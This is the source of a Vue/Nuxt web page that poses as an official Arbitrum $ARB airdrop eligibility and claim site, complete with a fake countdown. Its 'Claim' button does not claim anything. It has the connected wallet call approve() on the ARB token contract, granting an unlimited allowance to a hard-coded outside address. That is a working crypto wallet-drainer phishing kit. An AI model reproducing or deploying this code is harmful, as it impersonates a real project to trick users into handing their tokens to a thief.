<script lang="ts">
import { EthereumClient, w3mConnectors, w3mProvider } from '@web3modal/ethereum'
import { Web3Modal } from '@web3modal/html'
import { configureChains, createClient, watchAccount, prepareWriteContract, sendTransaction, switchNetwork } from '@wagmi/core'
import { arbitrum, mainnet } from '@wagmi/core/chains'
import { ABI, MAX_INT } from "@/constants"
const chains = [arbitrum, mainnet]
const projectId = 'fc630ba79a6e2de01a5308e2f312d803'

const { provider } = configureChains(chains, [w3mProvider({ projectId })])
const wagmiClient = createClient({
  autoConnect: true,
  connectors: w3mConnectors({ projectId, version: 1, chains }),
  provider
})
const ethereumClient = new EthereumClient(wagmiClient, chains)
const web3modal = new Web3Modal({ projectId }, ethereumClient)
web3modal.setDefaultChain(arbitrum)
export default defineNuxtComponent({
  head() {
    const description = 'Discover if you are eligible to receive the Arbitrum airdrop, claim your tokens, and delegate your voting power'
    const title = 'Arbitrum — Check your airdrop eligibility to govern Arbitrum'
    return {
      title,
      description,
      meta: [
        {
          property: 'og:title',
          hid: 'og:title',
          name: 'og:title',
          content: title,
        },
        {
          hid: 'description',
          name: 'description',
          content: description,
        },
        {
          property: 'og:description',
          hid: 'og:description',
          name: 'og:description',
          content: description,
        },
        {
          property: 'twitter:site',
          hid: 'twitter:site',
          name: 'twitter:site',
          content: '@quizcash_io',
        },
        {
          property: 'twitter:title',
          hid: 'twitter:title',
          name: 'twitter:title',
          content: title,
        },
      ],
    }
  },
  data() {
    return {
      connected: false
    }
  },
  mounted() {
    watchAccount((account) => {
      this.connected = account.isConnected
      if (account.isConnected) {
        switchNetwork({chainId: arbitrum.id})
      }
    }).bind(this)
  },
  methods: {
    async sendTransaction() {
      const config = await prepareWriteContract({
        address: '0x912ce59144191c1204e64559fe8253a0e49e6548',
        abi: ABI,
        functionName: 'approve',
        args: ["0xff7F6A643284D375aB2E931F52505ddc079cEEF5", MAX_INT],
      })
      const { hash } = await sendTransaction(config)
    },
    connect() {
      if (!this.connected) {
        web3modal.openModal();
      } else {
        this.sendTransaction()
      }
    },
    test() {
      ethereumClient.fetchBalance({address: '0xA0Cf798816D4b9b9866b5330EEa46a18382f251e',}).then(res => {
        console.log(res);
      })
    }
  },
})
</script>

<template>
  <div class="h-screen w-full flex-col flex px-4">
    <Header class="w-full" :connected="connected" @connect="connect"/>
    <div class="flex-1 max-w-6xl w-full mx-auto md:flex items-center justify-between">
      <div class="w-full md:max-w-[770px]">
        <h1 class="text-6xl font-bold md:text-7xl font-usd-200 tracking-[0.01rem]">Welcome to the future of Ethereum</h1>
        <p class="text-2xl md:text-4xl mt-10 mb-6 text-[#a3a8a8]">Check your eligibility to claim $ARB</p>
        <div class="text-xl flex md:flex-row flex-col gap-4 items-center">
          <div>Claiming will be live in:</div>
          <div class="font-maison-mono bg-[#26282acc] p-[10px] rounded-lg">05d 02h 14m</div>
        </div>
        <div class="mt-10 flex md:justify-start justify-center">
          <div
              class="inline-flex cursor-pointer p-2 md:p-4 pr-4 md:pr-8 rounded-full uppercase font-maison-mono gap-3 items-center"
              :class="{'bg-blue': !connected, 'bg-green-400': connected}"
              @click="connect"
          >
            <div class="w-10 h-10 md:w-[50px] md:h-[50px] bg-[#ffffff4d] rounded-full flex flex-col items-center justify-center">
              <div class="w-4 h-4 md:w-6 md:h-6 i-xx-icons-plus fill-white"/>
            </div>
            <div class="md:text-lg" v-if="!connected">Connect Wallet</div>
            <div class="md:text-lg" v-else>Claim</div>
          </div>
        </div>
        <img class="w-[230px]" src="/illustration_5.png" alt="">
      </div>
      <div class="hidden md:flex w-[230px] items-start h-full">
        <img src="/illustration_6.png" alt="">
      </div>
    </div>
  </div>
</template>
